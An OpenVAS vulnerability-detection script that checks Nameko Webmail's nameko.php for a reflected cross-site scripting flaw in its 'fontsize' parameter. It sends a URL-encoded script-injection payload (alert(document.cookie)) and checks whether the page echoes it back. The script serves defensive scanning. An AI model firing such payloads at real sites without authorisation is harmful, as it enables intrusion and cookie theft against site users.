###############################################################################
# OpenVAS Vulnerability Test
#
# Nameko Webmail Cross-Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803826");
  script_version("2022-02-14T13:47:12+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2022-02-14 13:47:12 +0000 (Mon, 14 Feb 2022)");
  script_tag(name:"creation_date", value:"2013-07-08 14:53:58 +0530 (Mon, 08 Jul 2013)");
  script_name("Nameko Webmail Cross-Site Scripting Vulnerability");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122221/Nameko_Webmail_XSS.txt");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/nameko-webmail-cross-site-scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"Nameko Webmail version 0.10.146 and prior");

  script_tag(name:"insight", value:"Input passed via the 'fontsize' parameter to 'nameko.php' php script is not
  properly sanitised before being returned to the user.");

  script_tag(name:"solution", value:"Upgrade to version 1.9.999.10 or later.");

  script_tag(name:"summary", value:"Nameko Webmail is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://sourceforge.net/projects/nameko");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/NamekoWebmail", "/webmail", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  req = http_get(item:string(dir,"/nameko.php"),  port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  if('>Nameko' >< res && 'Shelf<' >< res)
  {
    url = dir + '/nameko.php?fontsize=22pt%3B%2B%7D%2B%3C%2Fstyle%3E%3C'+
                 'script%3Ealert%28document.cookie%29%3C%2Fscript%3E%3C'+
                                   'style%3Ebody%2B%7B%2Bfont-size%3A22';

    if(http_vuln_check(port: port, url: url, check_header: TRUE,
       pattern: "<script>alert\(document.cookie\)</script>",
       extra_check: "font-size:22pt"))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
